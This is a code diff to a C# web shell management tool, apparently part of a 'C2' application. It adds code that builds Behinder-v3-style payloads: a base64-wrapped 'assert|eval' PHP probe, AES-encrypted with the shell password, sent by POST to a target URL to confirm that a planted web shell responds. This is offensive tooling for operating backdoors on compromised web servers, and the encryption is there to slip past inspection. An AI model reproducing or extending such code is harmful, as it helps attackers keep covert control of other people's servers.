@@ -1,4 +1,5 @@
-﻿using C2.Business.CastleBravo.WebShellTool.SettingsDialog;
+﻿using C2.Business.CastleBravo.Binary;
+using C2.Business.CastleBravo.WebShellTool.SettingsDialog;
 using C2.Core;
 using C2.Utils;
 using System;
@@ -7,6 +8,7 @@ using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
 using System.Runtime.Serialization.Formatters.Binary;
+using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
@@ -592,22 +594,51 @@ namespace C2.Business.CastleBravo.WebShellTool
             try
             {
                 string url = NetUtil.FormatUrl(task.Url);
-                string pass = task.Password;
                 string seed = RandomUtil.RandomInt(31415000, 31415926).ToString();
-                string php = string.Format("=print({0});", seed);
-                string asp = string.Format("=response.write({0})", seed);
-                // 默认按php算
-                string payload = task.TrojanType == "phpEval" ? php :
-                                 task.TrojanType == "aspEval" ? asp :
-                                 php;
-
-                string result = WebClientEx.Post(url, pass + payload, 1500, Proxy);
+                string result = WebClientEx.Post(url, GenBehinder3Payload(task, seed), 1500, Proxy);
                 return result.Contains(seed);
             }
             catch { return false; }
 
         }
+        private string GenBehinder3Payload(WebShellTaskConfig task, string seed)
+        {
+            string pass = task.Password;          
+            string php = string.Format("print({0});", seed);
+            string asp = string.Format("response.write({0})", seed);
+            // 默认按php算
+            string payload = task.TrojanType == "phpEval" ? php :
+                             task.TrojanType == "aspEval" ? asp :
+                             php;
 
+            if (task.ClientVersion == "三代冰蝎")
+            {
+                string behinderPayload  = string.Format( "assert|eval(base64_decode('{0}'))", ST.EncodeBase64(payload));                
+                string b = Encrypt(behinderPayload, pass);
+                return b;
+                
+            }
+             
+            return pass + "=" + payload;
+        }
+        protected string Encrypt(string encryptStr, string key)
+        {
+            key = ST.GenerateMD5(key).Substring(0, 16);
+            var _aes = new AesCryptoServiceProvider();
+            _aes.BlockSize = 128;
+            _aes.KeySize = 128;
+            _aes.Key = Encoding.UTF8.GetBytes(key);
+            _aes.IV = (byte[])(object)new sbyte[16];
+            _aes.Padding = PaddingMode.PKCS7;
+            _aes.Mode = CipherMode.CBC;
+
+            var _crypto = _aes.CreateEncryptor(_aes.Key, _aes.IV);
+            byte[] encrypted = _crypto.TransformFinalBlock(Encoding.UTF8.GetBytes(encryptStr), 0, Encoding.UTF8.GetBytes(encryptStr).Length);
+
+            _crypto.Dispose();
+
+            return System.Convert.ToBase64String(encrypted);
+        }
         private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
         {
             ClearAll();
